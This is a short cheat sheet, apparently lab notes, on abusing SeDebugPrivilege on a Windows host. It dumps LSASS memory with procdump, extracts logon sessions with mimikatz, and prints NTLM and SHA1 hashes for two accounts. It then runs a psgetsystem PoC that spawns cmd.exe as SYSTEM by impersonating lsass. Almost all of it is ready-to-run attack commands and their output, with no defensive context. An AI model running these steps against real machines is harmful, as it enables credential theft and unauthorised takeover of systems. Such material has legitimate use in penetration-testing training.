# SeDebugPrivilege

## Current User Privileges

```pwsh
PS C:\Users\jordan> whoami /priv
```

```output title="Output" hl_lines="6"
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

## Dumping Memory

```pwsh
PS C:\Users\jordan> C:\Tools\Procdump\procdump.exe -accepteula -ma lsass.exe C:\Tools\lsass
```

```output title="Output" hl_lines="5"
ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[13:55:29] Dump 1 initiated: C:\Tools\lsass.dmp
[13:55:29] Dump 1 writing: Estimated dump file size is 42 MB.
[13:55:29] Dump 1 complete: 42 MB written in 0.2 seconds
[13:55:29] Dump count reached.
```

## Mimikatz

```pwsh
PS C:\Users\jordan> C:\Tools\mimikatz.exe privilege::debug "sekurlsa::minidump C:\Tools\lsass.dmp" sekurlsa::logonpasswords exit
```

```output title="Output" hl_lines="12 37 62 87 112"
Authentication Id : 0 ; 703456 (00000000:000abbe0)
Session           : RemoteInteractive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 6/18/2025 1:39:14 PM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
        msv :
         [00000006] Primary
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * NTLM     : 30689ae6de22596f45afb9619f8e5fa0
         * SHA1     : 369b6cc895433f5534f0a23b3025266ab515a581
        tspkg :
        wdigest :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 703426 (00000000:000abbc2)
Session           : RemoteInteractive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 6/18/2025 1:39:14 PM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
        msv :
         [00000006] Primary
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * NTLM     : 30689ae6de22596f45afb9619f8e5fa0
         * SHA1     : 369b6cc895433f5534f0a23b3025266ab515a581
        tspkg :
        wdigest :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 1009807 (00000000:000f688f)
Session           : Interactive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 6/18/2025 1:41:36 PM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
        msv :
         [00000006] Primary
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * NTLM     : 30689ae6de22596f45afb9619f8e5fa0
         * SHA1     : 369b6cc895433f5534f0a23b3025266ab515a581
        tspkg :
        wdigest :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 266588 (00000000:0004115c)
Session           : Interactive from 1
User Name         : sccm_svc
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 6/18/2025 1:35:31 PM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1012
        msv :
         [00000006] Primary
         * Username : sccm_svc
         * Domain   : WINLPE-SRV01
         * NTLM     : 64f12cddaa88057e06a81b54e73b949b
         * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8
        tspkg :
        wdigest :
         * Username : sccm_svc
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : sccm_svc
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 266517 (00000000:00041115)
Session           : Interactive from 1
User Name         : sccm_svc
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 6/18/2025 1:35:31 PM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1012
        msv :
         [00000006] Primary
         * Username : sccm_svc
         * Domain   : WINLPE-SRV01
         * NTLM     : 64f12cddaa88057e06a81b54e73b949b
         * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8
        tspkg :
        wdigest :
         * Username : sccm_svc
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : sccm_svc
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
        credman :
```

## RCE as SYSTEM ([POC](https://github.com/decoder-it/psgetsystem))

```pwsh
PS C:\Users\jordan> . C:\Tools\psgetsys.ps1
PS C:\Users\jordan> ImpersonateFromParentPid -ppid (Get-Process lsass).Id -command "C:\Windows\System32\cmd.exe"
```
